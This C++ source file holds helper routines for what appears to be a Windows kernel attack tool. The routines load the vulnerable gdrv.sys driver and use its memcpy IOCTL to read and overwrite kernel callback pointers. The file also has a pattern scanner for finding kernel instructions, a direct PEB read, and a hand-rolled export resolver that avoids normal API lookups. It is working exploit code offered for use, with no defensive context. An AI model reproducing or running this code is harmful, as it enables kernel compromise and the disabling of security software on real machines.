#include "includes.h"
#include "win_api_defs.h"

DWORD64 helpers::FindInstructionWithPattern( DWORD64 imageBase, size_t imageSize, const unsigned char* pattern, size_t patternSize, size_t offsetAfterMatch = 0) {

    for ( size_t i = 0; i < imageSize - patternSize; ++i ) {
        size_t j = 0;
        for ( ; j < patternSize; ++j ) {
            unsigned char chr = *( unsigned char* )( imageBase + i + j );
            if ( pattern[j] != chr ) break;
        }
        if ( j == patternSize ) {
            DWORD64 matchAddr = imageBase + i + offsetAfterMatch;
            return matchAddr;
        }
    } return 0;
}

bool helpers::CompareAnsiWide( const char* ansiStr, const wchar_t* wideStr ) {
    while ( *ansiStr && *wideStr ) {
        if ( ( unsigned char )*ansiStr != ( wchar_t )*wideStr ) return false;
        ++ansiStr;
        ++wideStr;
    }
    return *ansiStr == 0 && *wideStr == 0;
}

void helpers::FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName ) {
    std::wstring_view fullPath( FileName );

    auto filename = [&]() -> std::wstring_view {
        size_t lastSlash = fullPath.find_last_of( L"\\/" );
        return ( lastSlash != std::wstring_view::npos )
            ? fullPath.substr( lastSlash + 1 )
            : fullPath;
    }( );

    auto servicePart = [&]() -> std::wstring_view {
        size_t dot = filename.find( L'.' );
        return filename.substr( 0, dot );
    }( );

    std::wstring final = std::wstring( SVC_BASE ) + std::wstring( servicePart );

    std::wmemcpy( ServiceName, final.data(), final.size() );
    ServiceName[final.size()] = L'\0';
}

NTSTATUS helpers::ReadOriginalCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64& outValue ) {
    GIOMemcpyInput MemcpyInput{};
    IO_STATUS_BLOCK IoStatusBlock{};

    MemcpyInput.Src = target;
    MemcpyInput.Dst = reinterpret_cast< ULONG64 >( &outValue );
    MemcpyInput.Size = sizeof( outValue );
    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );

    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr, &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
}

NTSTATUS helpers::WriteCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 value ) {
    GIOMemcpyInput MemcpyInput{};
    IO_STATUS_BLOCK IoStatusBlock{};

    MemcpyInput.Src = reinterpret_cast< ULONG64 >( &value );
    MemcpyInput.Dst = target;
    MemcpyInput.Size = sizeof( value );
    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );

    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr, &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
}

NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName ) {
    *outHandle = nullptr;

    // Try to open first (driver might already be loaded)
    NTSTATUS stat = modules::OpenDeviceHandle( outHandle, FALSE );

    if ( NT_SUCCESS( stat ) && *outHandle ) {
        wprintf( L"[*] Device handle opened successfully (preloaded): %p\n", *outHandle );
        return stat;
    }

    // Try to load the driver
    stat = modules::LoadDriver( LoaderServiceName );
    if ( !NT_SUCCESS( stat ) ) return stat;

    wprintf( L"[+] Vuln (gdrv.sys) loaded successfully\n" );

    std::this_thread::sleep_for( std::chrono::milliseconds( 200 ) );

    // Try to open device again after loading
    stat = modules::OpenDeviceHandle( outHandle, 0 );
    if ( !NT_SUCCESS( stat ) || !*outHandle ) return stat;

    wprintf( L"[*] Device handle opened successfully: %p\n", *outHandle );
    return stat;
}

PVOID helpers::GetProcessHeapFromPEB()
{
#ifdef _M_X64
    PPEB_CUSTOM pPeb = ( PPEB_CUSTOM )__readgsqword( 0x60 ); //read that mf directly (VERG Proj)
#else
    PPEB_CUSTOM pPeb = ( PPEB_CUSTOM )__readfsdword( 0x30 ); // For 32-bit
#endif
    return pPeb ? pPeb->ProcessHeap : nullptr;
}


uintptr_t helpers::GetProcAddress( void* hModule, const wchar_t* wAPIName )
{
    if ( !hModule || !wAPIName ) return 0;

    unsigned char* lpBase = reinterpret_cast< unsigned char* >( hModule );
    IMAGE_DOS_HEADER* idh = reinterpret_cast< IMAGE_DOS_HEADER* >( lpBase );

    if ( idh->e_magic != IMAGE_DOS_SIGNATURE ) return 0;

    IMAGE_NT_HEADERS64* nt = reinterpret_cast< IMAGE_NT_HEADERS64* >( lpBase + idh->e_lfanew );

    if ( nt->Signature != IMAGE_NT_SIGNATURE ) return 0;

    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    if ( !exportRVA ) return 0;

    auto exportDir = reinterpret_cast< IMAGE_EXPORT_DIRECTORY* >( lpBase + exportRVA );
    DWORD* nameRVAs = reinterpret_cast< DWORD* >( lpBase + exportDir->AddressOfNames );
    WORD* ordinals = reinterpret_cast< WORD* >( lpBase + exportDir->AddressOfNameOrdinals );
    DWORD* funcRVAs = reinterpret_cast< DWORD* >( lpBase + exportDir->AddressOfFunctions );

    for ( DWORD i = 0; i < exportDir->NumberOfNames; ++i ) {
        const char* exportName = reinterpret_cast< const char* >( lpBase + nameRVAs[i] );
        if ( CompareAnsiWide( exportName, wAPIName ) ) {
            WORD ordinal = ordinals[i];
            return reinterpret_cast< uintptr_t >( lpBase + funcRVAs[ordinal] );
        }
    }
    return 0;
}